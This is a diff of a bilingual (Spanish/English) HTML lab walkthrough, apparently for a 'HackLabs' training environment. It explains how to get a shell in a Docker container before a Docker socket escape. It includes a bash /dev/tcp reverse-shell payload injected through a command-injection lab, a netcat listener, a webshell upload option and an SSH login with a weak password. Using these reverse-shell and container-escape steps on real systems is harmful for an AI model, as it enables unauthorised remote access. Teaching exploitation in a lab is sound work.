@@ -90,9 +90,7 @@
   <div class="lang-content" data-lang="es">
     <h3>Prerequisito — Obtener shell en el contenedor desde Kali</h3>
     <p>HackLabs corre dentro de un contenedor Docker. Antes de explotar el escape necesitas una shell dentro del contenedor:</p>
-    <pre># Detecta tu IP de Kali (interfaz macvlan0):
-KALI_IP=$(ip -4 addr show macvlan0 2>/dev/null | grep -oP '(?&lt;=inet )\S+' | cut -d/ -f1)
-echo "Kali IP: $KALI_IP"
+    <pre># Tu IP de Kali (detectada desde el navegador): {{ client_ip }}
 
 # Opción A — Reverse shell via lab CMDI (recomendada)
 # 1. En Kali, escucha conexiones:
@@ -100,20 +98,25 @@ nc -lvnp 4444
 
 # 2. En el lab CMDI (/cmdi), inyecta el payload en el formulario:
 #    Comando de prueba: id
-#    Reverse shell: bash -c 'bash -i >&amp; /dev/tcp/$KALI_IP/4444 0>&amp;1'
+#    Reverse shell: bash -c 'bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1'
 
 # Opción B — Shell via webshell (lab File Upload)
 # Sube un webshell PHP/Python y accede desde el navegador.
 
-# Opción C — SSH bruteforce al host (lab Bruteforce)
-ssh admin@TARGET_IP    # contraseña: password1</pre>
+# Opción C — SSH al contenedor (lab Bruteforce)
+# NOTA: Este SSH te conecta directamente DENTRO del contenedor Docker.
+# No necesitas pasos adicionales para entrar al contenedor — ya estás dentro.
+ssh admin@{{ target_ip }}    # contraseña: password1</pre>
 
     <h3>Easy — Docker Socket Escape</h3>
     <p>El socket de Docker está montado dentro del contenedor. Cualquier proceso con acceso al socket puede lanzar contenedores privilegiados en el host.</p>
     <ol>
       <li>Verifica que estás en un contenedor:
-        <pre>cat /proc/1/cgroup | grep -i docker
-# Si ves "/docker/..." → estás dentro de un contenedor</pre>
+        <pre># Método fiable (funciona en cgroupsv1 y cgroupsv2):
+ls /.dockerenv &amp;&amp; echo "DENTRO del contenedor" || echo "no detectado"
+
+# Alternativa (solo cgroupsv1 — en kernels &gt;=6.x puede devolver vacío):
+cat /proc/1/cgroup | grep -i docker</pre>
       </li>
       <li>Verifica que el socket existe y está accesible:
         <pre>ls -la /var/run/docker.sock
@@ -196,9 +199,7 @@ cat /output</pre>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Prerequisite — Get a shell inside the container from Kali</h3>
     <p>HackLabs runs inside a Docker container. Before exploiting the escape you need a shell inside the container:</p>
-    <pre># Detect your Kali IP (macvlan0 interface):
-KALI_IP=$(ip -4 addr show macvlan0 2>/dev/null | grep -oP '(?&lt;=inet )\S+' | cut -d/ -f1)
-echo "Kali IP: $KALI_IP"
+    <pre># Your Kali IP (detected from browser): {{ client_ip }}
 
 # Option A — Reverse shell via CMDI lab (recommended)
 # 1. On Kali, listen for connections:
@@ -206,20 +207,25 @@ nc -lvnp 4444
 
 # 2. In the CMDI lab (/cmdi), inject the payload in the form:
 #    Test command: id
-#    Reverse shell: bash -c 'bash -i >&amp; /dev/tcp/$KALI_IP/4444 0>&amp;1'
+#    Reverse shell: bash -c 'bash -i &gt;&amp; /dev/tcp/{{ client_ip }}/4444 0&gt;&amp;1'
 
 # Option B — Shell via webshell (File Upload lab)
 # Upload a PHP/Python webshell and access it from the browser.
 
-# Option C — SSH bruteforce to the host (Bruteforce lab)
-ssh admin@TARGET_IP    # password: password1</pre>
+# Option C — SSH into the container (Bruteforce lab)
+# NOTE: This SSH connects you directly INSIDE the Docker container.
+# No additional steps needed to enter the container — you are already inside.
+ssh admin@{{ target_ip }}    # password: password1</pre>
 
     <h3>Easy — Docker Socket Escape</h3>
     <p>The Docker socket is mounted inside the container. Any process with socket access can launch privileged containers on the host.</p>
     <ol>
       <li>Verify you are inside a container:
-        <pre>cat /proc/1/cgroup | grep -i docker
-# If you see "/docker/..." → you are inside a container</pre>
+        <pre># Reliable method (works on cgroupsv1 and cgroupsv2):
+ls /.dockerenv &amp;&amp; echo "INSIDE container" || echo "not detected"
+
+# Alternative (cgroupsv1 only — on kernels &gt;=6.x may return empty):
+cat /proc/1/cgroup | grep -i docker</pre>
       </li>
       <li>Verify the socket exists and is accessible:
         <pre>ls -la /var/run/docker.sock
